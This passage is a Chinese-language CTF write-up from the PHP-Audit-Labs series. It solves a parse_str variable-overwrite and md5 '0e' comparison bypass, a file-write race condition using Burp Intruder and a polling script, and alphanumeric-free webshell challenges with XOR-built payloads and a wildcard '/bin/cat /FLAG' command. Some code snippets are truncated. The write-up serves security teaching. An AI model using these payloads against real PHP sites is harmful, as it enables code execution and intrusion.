### 解题方法
在 **index.php** 第4行存在 **@parse_str($id);** 这个函数不会检查变量 **$id**
是否存在，如果通过其他方式传入数据给变量 **$id** ,且当前 **$id** 中数据存在，它将会直接覆盖掉。而在第6行有一段这样代码。
    if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO'))
**PHP Hash比较存在缺陷**
，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。而这里的
**md5(‘QNKCDZO’)** 的结果是 **0e830400451993494058024219903391** 。所以payload为
**?id=a[0]=s878926199a** 。这样就可以在页面上回显。
    echo 'flag is here';
而这题真正的考察点在这里。在 **uploadsomething.php** 的第三行和第四行有这样两句代码如下：
    $referer = $_SERVER['HTTP_REFERER'];
    if(isset($referer)!== false)
这里有个 **refer** 判断，判断 **refer** 是否存在，如果有展现上传页面，如果没有，就返回 **you can not see this
page** 。
据我们所知，通过a标签点击的链接，会自己自动携带上refer字段。然后 **携带refer** 和 **不携带refer** ，返回的结果不一样。
**携带refer** 的情况：
**不携带refer** 的情况：
然后在 **uploadsomething.php** 的第13行和第18行有这样代码如下：
    $content = 'HRCTF{y0u_n4ed_f4st}   by:l1nk3r';
    file_put_contents("$savepath" . $_GET['filename'], $content);
    $msg = 'Flag is here,come on~ ' . $savepath . htmlspecialchars($_GET['filename']) . "";
    usleep(100000);
    $content = "Too slow!";
    file_put_contents("$savepath" . $_GET['filename'], $content);
这里有一句关键就是 **usleep(100000);** 这题需要在写入 **too slow**
之前，访问之前写入的文件，即可获得flag，这里就存在时间竞争问题。但是我们看到其实这里的文件夹路径是固定写死的。
直接访问会返回 **too slow** 。
因此这里的解法是，开Burp的200线程，一个不断发包
    http://127.0.0.1/parse_str/uploadsomething.php?filename=flag&content=111
burp发包是在 **intruder** 模块中，首先选择数据包，右键点击选择 **Send to Intruder** 。
然后在 **positions** 点击 **clear** 按钮
在 **payload** 中选择 **payload type** 为 **null payloads** ， **generate**
选择200，然后再可以点击 **start attack** 了。
在 **start attack** 之前需要一个脚本不断请求下面这个链接
    http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag
**脚本代码** ：
    import requests as r
    r1=r.Session()
    while (1):
    r2=r1.get("http://127.0.0.1/parse_str/uploads/4b84b15bff6ee5796152495a230e45e3d7e947d9/flag")
        print r2.text
        pass
一会儿就看到了flag
## Day8题解：(By 七月火)
**Day8** 的题目来自8月份 **金融业网络安全攻防比赛** ，写题解的时候发现 **信安之路** 已经写了很好的题解，具体可以点
[这里](https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w) ，所以接下来我只会提及关键部分。
**第1道题目如下** ：
这道题目实际上是考察不包含字母数字的webshell利用，大家可以参考 **phithon**
师傅的文章：[一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html) ，我们只需要构造并调用 **getFlag**
函数即可获得flag。排除这里正则的限制，正常的想法payload应该类似这样（把上图代码中的正则匹配注释掉进行测试）：
    index.php?code=getFlag();
    index.php?code=$_GET[_]();&_=getFlag
我们现在再来考虑考虑如何绕过这里的正则。游戏规则很简单，要求我们传入的 **code** 参数不能存在字母及数字，这就很容易想到 **phithon**
师傅的 [一些不包含数字和字母的webshell](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html) 一文。通过异或 **^** 运算、取反 **~** 运算，构造出我们想要的字符就行。这里我们直接看
**payload** ：
    ?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=getFlag
我们来拆解分析一下 **payload** ， **eval** 函数会执行如下字符串：
    $_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=getFlag
    拆解如下：                第1个GET请求参数：code          &     第2个GET请求参数：_
       $_="`{{{"^"?<>/";         ${$_}[_](${$_}[__]);      &     _=getFlag
       $_="_GET";                $_GET[_]($_GET[__]);      &     _=getFlag
                                 getFlag($_GET[__]);
                                 getFlag(null);
这个 **payload** 的长度是 **37** ，符合题目要求的 **小于等于40** 。另外，我 **fuzz** 出了长度为 **28** 的
**payload** ，如下：
    $_="{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c";$_();
这里也给出 **fuzz** 脚本，方便大家进行 **fuzz** 测试：
    ";
        }
    }
    echo "{{{{{{{"^chr(28).chr(30).chr(15).chr(61).chr(23).chr(26).chr(28);
    ?>
后来在安全客看到一种新的思路，也很不错，具体参考：[CTF题目思考--极限利用](https://www.anquanke.com/post/id/154284) 。这篇文章主要是 **利用通配符调用Linux系统命令**
来查看 **flag** ，关于通配符调用命令的文章，大家可以参考：
[web应用防火墙逃逸技术（一）](https://www.anquanke.com/post/id/145518) 。
我们来分析安全客这篇文章中的payload：
    $_=`/???/??? /????`;?>
    实际上等价于：
    $_=`/bin/cat /FLAG`;?>
这里我想说一下 **** 这个代码的意思。实际上这串代码等价于 **** 。实际上，当 **php.ini** 中的
**short_open_tag** 开启的时候， **** 短标签就相当于 **** ， **** 也等价于
**** ，这也就解决了输出结果的问题。下面我们再来看第二道题目。
**第2道题目如下** ：
这道题目实际上和上面那道题目差不多，只是过滤了一个下划线 **_** 而已，我们可以用中文来做变量名：
    $哼="{{{{{{{"^"%1c%1e%0f%3d%17%1a%1c";$哼();
当然，我们也可以 **fuzz** 可用的 **ASCII** 做变量名， **fuzz** 代码如下：
    import requests
    for i in range(0,256):
        asc = "%%%02x" % i
        url = 'http://localhost/demo/index2.php?code=$%s="{{{{{{{"^"%%1c%%1e%%0f%%3d%%17%%1a%%1c";$%s();' % (asc,asc)
        r = requests.get(url)
        if 'HRCTF' in r.text:
            print("%s 可用" %asc)
可以看到此时 **payload** 长度为 **28** 。当然还有其他 **payload** ，例如下面这样的，原理都差不多，大家自行理解。
    $呵="`{{{"^"?<>/";${$呵}[呵](${$呵}[呵]);&呵=getFlag
## 总结
我们的项目会慢慢完善，如果大家喜欢可以关注 [ **PHP-Audit-Labs** ](https://github.com/hongriSec/PHP-Audit-Labs) 。大家若是有什么更好的解法，可以在文章底下留言，祝大家玩的愉快！